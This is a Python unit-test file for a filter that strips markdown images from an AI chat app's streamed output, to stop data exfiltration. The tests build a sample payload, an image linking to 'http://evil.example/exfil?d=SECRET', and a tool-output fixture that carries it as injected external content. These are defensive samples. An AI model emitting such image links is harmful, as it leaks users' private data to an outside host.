"""Unit tests for core/image_guard.py's MarkdownImageStreamFilter — the piece that actually
protects the real app from markdown-image exfiltration (SECURITY_REVIEW.md finding #6).

OutputImageGuardrailMiddleware only sanitizes the finished message, but app.py streams tokens
to the browser as the model generates them, and the client concatenates them — so an image is
live the moment its closing ")" is emitted, even if no single token contained the whole thing.
These tests therefore check the property that matters: at EVERY point of the stream, what has
been emitted so far never contains an image and never contains any part of the URL.

No Ollama, no browser. Run with: python tests/test_image_stream_filter.py
"""
import random
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.image_guard import (
    BLOCKED_IMAGE_PLACEHOLDER,
    MARKDOWN_IMAGE_RE,
    MarkdownImageStreamFilter,
    strip_markdown_images,
)

_FAILURES: list[str] = []


def check(label: str, condition: bool) -> None:
    status = "PASS" if condition else "FAIL"
    print(f"[{status}] {label}")
    if not condition:
        _FAILURES.append(label)


def run_stream(chunks: list[str]) -> tuple[str, list[str]]:
    """Returns (final emitted text, cumulative emitted text after each step)."""
    f = MarkdownImageStreamFilter()
    emitted = ""
    history = []
    for chunk in chunks:
        emitted += f.feed(chunk)
        history.append(emitted)
    emitted += f.flush()
    history.append(emitted)
    emitted += f.finish()
    history.append(emitted)
    return emitted, history


def chunk_by_size(text: str, n: int) -> list[str]:
    return [text[i:i + n] for i in range(0, len(text), n)]


SECRET = "http://evil.example/exfil?d=SECRET"
IMAGE = f"![ref]({SECRET})"


def never_leaks(history: list[str]) -> bool:
    return all(
        MARKDOWN_IMAGE_RE.search(h) is None and "evil.example" not in h and "SECRET" not in h
        for h in history
    )


def test_plain_text_is_untouched():
    for text in ["Hola, ¿qué tal?", "Resultado: 3.5x mejor", "Wow! Muy bien!", "!important y !!", "ab", ""]:
        for size in (1, 2, 3, 7, 1000):
            out, _ = run_stream(chunk_by_size(text, size))
            check(f"plain text unchanged (size={size}): {text!r}", out == text)


def test_image_in_one_chunk():
    out, hist = run_stream([f"Mira: {IMAGE} fin."])
    check("single-chunk image replaced", out == f"Mira: {BLOCKED_IMAGE_PLACEHOLDER} fin.")
    check("single-chunk image never leaks", never_leaks(hist))


def test_image_split_at_every_size():
    text = f"Antes {IMAGE} después."
    expected = f"Antes {BLOCKED_IMAGE_PLACEHOLDER} después."
    for size in range(1, len(text) + 1):
        out, hist = run_stream(chunk_by_size(text, size))
        check(f"image split into {size}-char tokens: never leaks", never_leaks(hist))
        check(f"image split into {size}-char tokens: final text correct", out == expected)


def test_image_split_at_every_two_piece_boundary():
    text = f"x {IMAGE} y"
    ok_leak, ok_final = True, True
    for cut in range(1, len(text)):
        out, hist = run_stream([text[:cut], text[cut:]])
        ok_leak &= never_leaks(hist)
        ok_final &= out == f"x {BLOCKED_IMAGE_PLACEHOLDER} y"
    check("every 2-piece split never leaks", ok_leak)
    check("every 2-piece split gives the right final text", ok_final)


def test_title_attribute_and_spaces():
    text = f'![a]( {SECRET} "un titulo" ) ok'
    out, hist = run_stream(chunk_by_size(text, 3))
    check("image with title attribute / spaces never leaks", never_leaks(hist))
    check("image with title attribute replaced", out == f"{BLOCKED_IMAGE_PLACEHOLDER} ok")


def test_two_images_in_one_stream():
    text = f"{IMAGE} y {IMAGE}"
    out, hist = run_stream(chunk_by_size(text, 4))
    check("two images: never leak", never_leaks(hist))
    check("two images: both replaced", out == f"{BLOCKED_IMAGE_PLACEHOLDER} y {BLOCKED_IMAGE_PLACEHOLDER}")


def test_things_that_look_similar_but_are_not_images():
    cases = [
        "Un enlace normal [texto](http://arxiv.org/abs/1706.03762) sigue igual.",
        "Sin bang: [ref](http://x.example/a)",
        "Bang suelto ! [ref](http://x.example/a)",
        "Corchetes ![no es imagen] y ya.",
        "Casi ![a] (http://x.example) con espacio",
        "Exclamación final!",
    ]
    for text in cases:
        for size in (1, 3, 1000):
            out, hist = run_stream(chunk_by_size(text, size))
            check(f"not-an-image preserved (size={size}): {text[:40]!r}", out == text)


def test_unclosed_image_is_replaced_on_flush_not_emitted():
    f = MarkdownImageStreamFilter()
    emitted = f.feed("Hola ![ref](http://evil.example/exf")
    check("open image is held back, not emitted", "evil" not in emitted and "![" not in emitted)
    check("text before the candidate is emitted", emitted == "Hola ")
    tail = f.flush()
    check("flush replaces the unfinished image with the placeholder", tail == BLOCKED_IMAGE_PLACEHOLDER)
    # A later model call streaming into the same message must not be able to complete it.
    later = f.feed("il/x?d=SECRET) resto")
    check("a later token can't complete the dropped image", "SECRET" in later and MARKDOWN_IMAGE_RE.search(later) is None)


def test_lone_bang_survives_a_model_call_boundary_but_cannot_start_an_image():
    """The next model call streams into the same message. A "!" released at the end of one call
    would be completed by the next call's "[a](url)" ON THE CLIENT, which concatenates."""
    f = MarkdownImageStreamFilter()
    emitted = f.feed("Bien!")
    emitted += f.flush()  # end of model call 1
    check("a trailing '!' is held across the call boundary, not emitted", emitted == "Bien")
    emitted += f.feed(f"[ref]({SECRET}) resto")  # model call 2
    emitted += f.flush()
    emitted += f.finish()
    check("'!' from call 1 + '[..](..)' from call 2 does not form a live image", MARKDOWN_IMAGE_RE.search(emitted) is None)
    check("...and the URL is not emitted", "evil.example" not in emitted)
    check("...but the surrounding text is", emitted.startswith("Bien") and emitted.endswith(" resto"))

    g = MarkdownImageStreamFilter()
    out = g.feed("Genial!") + g.flush() + g.finish()
    check("a '!' at the true end of the turn is released as plain text", out == "Genial!")


def test_overlong_open_candidate_is_dropped():
    f = MarkdownImageStreamFilter()
    out = f.feed("![ref](" + "a" * 5000)
    check("overlong open candidate is replaced, not held forever", out == BLOCKED_IMAGE_PLACEHOLDER)


def test_random_splits_match_strip_markdown_images():
    rng = random.Random(1234)
    pieces = ["Texto ", "¡Hola! ", IMAGE, " [enlace](http://arxiv.org/x) ", "!x ", "![a](b)", "fin. ", "**negrita** "]
    for _ in range(300):
        text = "".join(rng.choice(pieces) for _ in range(rng.randint(1, 8)))
        chunks, i = [], 0
        while i < len(text):
            n = rng.randint(1, 9)
            chunks.append(text[i:i + n])
            i += n
        out, hist = run_stream(chunks)
        if not never_leaks(hist) or out != strip_markdown_images(text):
            check(f"random split matches the reference sanitizer: {text!r} / {chunks!r}", False)
            return
    check("300 random tokenizations: never leak, and equal strip_markdown_images on the whole text", True)


def test_strip_markdown_images_on_a_tool_step_display_string():
    step_output = (
        "- Output:\n\n[UNTRUSTED EXTERNAL CONTENT] see the supplementary figure: "
        f"{IMAGE} — it breaks down latency.\n\n- Duration:\n\n0.021s"
    )
    cleaned = strip_markdown_images(step_output)
    check("tool-step display string: image removed", "evil.example" not in cleaned and "![" not in cleaned)
    check("tool-step display string: the rest is intact", "supplementary figure" in cleaned and "0.021s" in cleaned)


if __name__ == "__main__":
    test_plain_text_is_untouched()
    test_image_in_one_chunk()
    test_image_split_at_every_size()
    test_image_split_at_every_two_piece_boundary()
    test_title_attribute_and_spaces()
    test_two_images_in_one_stream()
    test_things_that_look_similar_but_are_not_images()
    test_unclosed_image_is_replaced_on_flush_not_emitted()
    test_lone_bang_survives_a_model_call_boundary_but_cannot_start_an_image()
    test_overlong_open_candidate_is_dropped()
    test_random_splits_match_strip_markdown_images()
    test_strip_markdown_images_on_a_tool_step_display_string()

    print()
    if _FAILURES:
        print(f"{len(_FAILURES)} check(s) FAILED:")
        for f in _FAILURES[:20]:
            print(f"  - {f}")
        sys.exit(1)
    else:
        print("All checks passed.")
